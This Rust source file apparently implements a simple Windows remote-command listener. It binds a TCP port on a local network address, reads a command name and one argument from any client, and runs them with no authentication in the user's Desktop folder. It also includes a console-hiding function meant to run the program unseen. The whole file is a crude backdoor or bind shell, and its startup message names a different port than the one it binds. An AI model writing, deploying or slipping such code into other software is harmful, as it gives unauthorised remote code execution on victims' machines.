use std::io::prelude::*;
use std::net::TcpListener;
use std::net::TcpStream;
use whoami;
use std::process::Command;

fn hide_console_window() {
    unsafe { winapi::um::wincon::FreeConsole() };
}

fn str_to_vec(buffer: String) -> Vec<String> {
    let v: Vec<&str> = buffer.split(' ').collect();
    let v = v.iter().map(|i| i.to_string()).collect();
    v
}

fn handle_connection(mut stream: TcpStream) {
    let mut buffer = [0; 100];

    stream.read(&mut buffer).unwrap();
    println!("Request: {}", String::from_utf8_lossy(&buffer[..]));

    let string_buffer = String::from_utf8(buffer.to_vec()).unwrap();

    let mut args = str_to_vec(string_buffer);

    for item in &mut args {
        let slice = item.trim_matches(char::from(0));
        *item = slice.to_string();
        // println!("{}", *item);
    }

    match args.len() {
        2 => {
            let mut command = Command::new(&args[0]);
            let uname = whoami::username();

            command.arg(&args[1]);
            println!("{}", uname);
            command.current_dir(format!("\\Users\\{}\\Desktop", uname));

            match command.status() {
                Ok(a) => println!("done! {}", a),
                Err(e) => println!("err {}", e)
            }
        },
        _ => println!("not handled yet")
    }
}


fn main() {
    // hide_console_window();
    let listener = TcpListener::bind("192.168.1.19:3001").unwrap();

    println!("Server running on port 7878");

    for stream in listener.incoming() {
        let stream = stream.unwrap();

        println!("got connections {:?}", stream);
        handle_connection(stream);
    }

}